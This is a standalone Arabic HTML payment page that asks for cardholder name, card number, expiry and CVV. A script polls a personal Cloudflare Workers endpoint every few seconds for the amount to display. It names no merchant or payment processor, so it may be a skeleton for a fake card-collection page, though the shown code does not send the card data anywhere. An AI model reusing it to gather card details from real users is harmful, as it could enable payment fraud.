<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>بوابة دفع</title>

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}

html,body{
  margin:0;
  padding:0;
  background:#f3f3f3;
  font-family:Arial, sans-serif;
  color:#111;
}

.page{
  width:100%;
  max-width:380px;
  margin:0 auto;
  padding:20px 14px;
}

.amount-title{
  text-align:center;
  font-size:16px;
  font-weight:700;
  margin-bottom:10px;
}

.amount-value{
  text-align:center;
  font-size:32px;
  font-weight:900;
  direction:ltr;
  margin-bottom:32px;
}

.divider{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  margin-bottom:32px;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  max-width:70px;
  height:2px;
  background:#cecece;
}

.divider span{
  font-size:22px;
  font-weight:700;
}

.field-group{
  margin-bottom:22px;
}

.label{
  display:block;
  font-size:20px;
  font-weight:700;
  margin-bottom:10px;
}

.input{
  width:100%;
  height:64px;
  border:2px solid #cfcfcf;
  border-radius:16px;
  background:#f7f7f7;
  font-size:18px;
  padding:0 14px;
  outline:none;
}

.card-head{
  display:flex;
  align-items:center;
  justify-content:space-between;
  margin-bottom:10px;
}

.card-logo-top{
  width:130px;
  height:37px;
  display:flex;
  align-items:flex-start;
  justify-content:center;
}

.card-logo-top img{
  height:37px;
  width:auto;
  object-fit:contain;
  transform: translateY(-4px);
  background:none;
  border:none;
  box-shadow:none;
}

.card-number{
  direction:ltr;
  text-align:left;
}

.row{
  display:flex;
  gap:10px;
  margin-top:10px;
}

.col{
  flex:1;
}

.pay-btn{
  width:100%;
  height:64px;
  margin-top:16px;
  border:none;
  border-radius:16px;
  background:#2ac769;
  color:#fff;
  font-size:20px;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="page">

  <div class="amount-title">المبلغ</div>
  <div class="amount-value" id="topAmount">SAR 0.00</div>

  <div class="divider">
    <span>ادفع عن طريق البطاقة</span>
  </div>

  <div class="field-group">
    <label class="label">اسم حامل البطاقة</label>
    <input class="input" placeholder="اسم حامل البطاقة">
  </div>

  <div class="field-group">

    <div class="card-head">
      <label class="label">معلومات البطاقة</label>

      <div class="card-logo-top">
        <img src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png">
      </div>
    </div>

    <input class="input card-number" placeholder="0000 0000 0000 0000">

    <div class="row">
      <div class="col">
        <input class="input" placeholder="MM/YY">
      </div>

      <div class="col">
        <input class="input" placeholder="CVV">
      </div>
    </div>

  </div>

  <button class="pay-btn" id="payBtn">ادفع SAR 0.00</button>

</div>

<script>
const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
const STORAGE_KEY = "saved_payment_amount";

function normalizeAmount(value) {
  if (!value || typeof value !== "string") return "SAR 0.00";
  return value.trim();
}

function setAmount(amount) {
  const finalAmount = normalizeAmount(amount);
  document.getElementById("topAmount").textContent = finalAmount;
  document.getElementById("payBtn").textContent = "ادفع " + finalAmount;
  localStorage.setItem(STORAGE_KEY, finalAmount);
}

// 1) اعرض آخر مبلغ محفوظ فورًا
const savedAmount = localStorage.getItem(STORAGE_KEY);
if (savedAmount) {
  setAmount(savedAmount);
} else {
  setAmount("SAR 0.00");
}

// 2) بعدها اسحب آخر مبلغ من العامل
async function loadAmount() {
  try {
    const res = await fetch(API_URL + "?t=" + Date.now(), {
      cache: "no-store"
    });

    const data = await res.json();

    if (data && data.amount) {
      setAmount(data.amount);
    }
  } catch (e) {
    console.log("تعذر تحميل المبلغ", e);
  }
}

loadAmount();
setInterval(loadAmount, 3000);
</script>

</body>
</html>
